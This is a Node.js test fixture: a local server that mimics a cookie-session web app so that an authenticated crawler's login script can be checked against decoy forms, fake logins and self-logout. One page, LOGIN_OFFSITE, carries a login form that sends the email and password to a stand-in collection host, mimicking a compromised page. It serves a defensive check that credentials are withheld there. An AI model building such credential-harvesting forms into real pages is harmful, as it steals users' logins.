// Fixture for AUTHENTICATED recon. A cookie-session app:
//   GET  /login     — email + password form (POST /login).
//   POST /login      — valid creds → Set-Cookie sid + 302 /dashboard; invalid → 200 re-render
//                      with #error and the password field still present (the "failed" signal).
//   GET  /dashboard  — cookie valid → the AUTHENTICATED surface: #account (an authed-only
//                      control, absent when logged out), plus the real traffic classes the
//                      test doctrine requires — a load-burst fetch (GET /api/me on load), a
//                      background poll (GET /api/ping every 400ms), and a click-caused request
//                      (#load-more → POST /api/items). No cookie → 302 /login.
//   GET  /logout     — clears the cookie, 302 /login, and COUNTS hits so a test can assert the
//                      crawl never logged itself out by navigation (logoutHits() === 0).
//   GET  /welcome    — a public page with one safe control (#go), used as the crawl's progress
//                      control in the self-logout guard test.
//   GET  /api/*      — json endpoints backing the traffic classes above.
//
// The valid credentials are injected by start() so a test can set the password to a sentinel
// (the no-credential-leak guard) without hardcoding it here.

import http from 'node:http';

const SID = 'sid=ok';

const LOGIN = (error) => `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Login</title></head>
<body>
  <h1>Sign in</h1>
  <!-- Decoy form BEFORE the login form: a header newsletter with its OWN email + submit.
       login.mjs must anchor on the password field and scope the username + submit to ITS
       form; a document-order heuristic would fill this decoy email and click Subscribe. -->
  <form id="newsletter" method="get" action="/newsletter">
    <input type="email" id="news-email" name="news" placeholder="Newsletter email">
    <button type="submit" id="subscribe">Subscribe</button>
  </form>
  <form method="post" action="/login">
    <input type="email" id="email" name="email" placeholder="Email">
    <input type="password" id="password" name="password" placeholder="Password">
    <button type="submit" id="submit">Sign in</button>
  </form>
  ${error ? '<p id="error">Invalid credentials</p>' : ''}
</body></html>`;

const DASHBOARD = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Dashboard</title></head>
<body>
  <h1>Dashboard</h1>
  <button type="button" id="account">Account</button>
  <button type="button" id="load-more">Load more</button>
  <script>
    // load-burst: a request that fires as the authed page loads.
    fetch('/api/me').catch(() => {});
    // background poll: the adversarial traffic class — must NOT be credited to a click.
    setInterval(() => { fetch('/api/ping').catch(() => {}); }, 400);
    // click-caused request: the real control→request edge.
    document.getElementById('load-more').addEventListener('click', () => {
      fetch('/api/items', { method: 'POST' }).catch(() => {});
    });
  </script>
</body></html>`;

const WELCOME = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Welcome</title></head>
<body><h1>Welcome</h1><button type="button" id="go">Browse</button></body></html>`;

// A login form that "succeeds" superficially — the submit navigates AWAY from the form (password
// gone) — but the server sets ONLY an analytics cookie, no session. This is the silent-guest-crawl
// bug: the old "password field gone → success" heuristic would persist a storageState for a
// logged-OUT session. login.mjs must now fail loud (no non-tracking session artifact).
const LOGIN_TRACKING = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Login</title></head>
<body>
  <h1>Sign in</h1>
  <form method="post" action="/login-tracking">
    <input type="email" id="email" name="email" placeholder="Email">
    <input type="password" id="password" name="password" placeholder="Password">
    <button type="submit" id="submit">Sign in</button>
  </form>
</body></html>`;

// A login form whose action posts OFF-ORIGIN (a compromised/XSS'd login page). login.mjs
// must refuse to submit the credentials here. `.invalid` never resolves (RFC 2606).
const LOGIN_OFFSITE = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Login</title></head>
<body>
  <h1>Sign in</h1>
  <form method="post" action="https://off.example.invalid/collect">
    <input type="email" id="email" name="email" placeholder="Email">
    <input type="password" id="password" name="password" placeholder="Password">
    <button type="submit" id="submit">Sign in</button>
  </form>
</body></html>`;

function readBody(req) {
  return new Promise((resolve) => {
    let data = '';
    req.on('data', (c) => { data += c; if (data.length > 1e5) req.destroy(); });
    req.on('end', () => resolve(data));
  });
}

function authed(req) {
  return String(req.headers.cookie || '').split(/;\s*/).includes(SID);
}

export function start(port, { user = 'admin@example.test', pass = 'correct-horse' } = {}) {
  let logoutHits = 0;
  const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, 'http://x');
    const p = url.pathname;

    if (p === '/login' && req.method === 'POST') {
      const body = new URLSearchParams(await readBody(req));
      if (body.get('email') === user && body.get('password') === pass) {
        res.writeHead(302, { 'set-cookie': `${SID}; Path=/; HttpOnly`, location: '/dashboard' });
        res.end();
      } else {
        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
        res.end(LOGIN(true));
      }
      return;
    }
    if (p === '/login') { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); res.end(LOGIN(false)); return; }
    if (p === '/dashboard') {
      if (!authed(req)) { res.writeHead(302, { location: '/login' }); res.end(); return; }
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); res.end(DASHBOARD); return;
    }
    if (p === '/logout') {
      logoutHits++;
      res.writeHead(302, { 'set-cookie': 'sid=; Path=/; Max-Age=0', location: '/login' }); res.end(); return;
    }
    if (p === '/login-tracking' && req.method === 'POST') {
      // Leaves the form (302 to /welcome, no password field there) but sets ONLY an analytics cookie.
      res.writeHead(302, { 'set-cookie': '_ga=GA1.2.987654321.1700000000; Path=/', location: '/welcome' });
      res.end(); return;
    }
    if (p === '/login-tracking') { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); res.end(LOGIN_TRACKING); return; }
    if (p === '/welcome') { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); res.end(WELCOME); return; }
    if (p === '/login-offsite') { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); res.end(LOGIN_OFFSITE); return; }
    if (p.startsWith('/api/')) {
      res.writeHead(200, { 'content-type': 'application/json; charset=utf-8' }); res.end('{"ok":true}'); return;
    }
    res.writeHead(404, { 'content-type': 'text/html; charset=utf-8' }); res.end('<h1>404</h1>');
  });
  return new Promise((resolve) => server.listen(port, '127.0.0.1', () => {
    server.logoutHits = () => logoutHits;
    resolve(server);
  }));
}
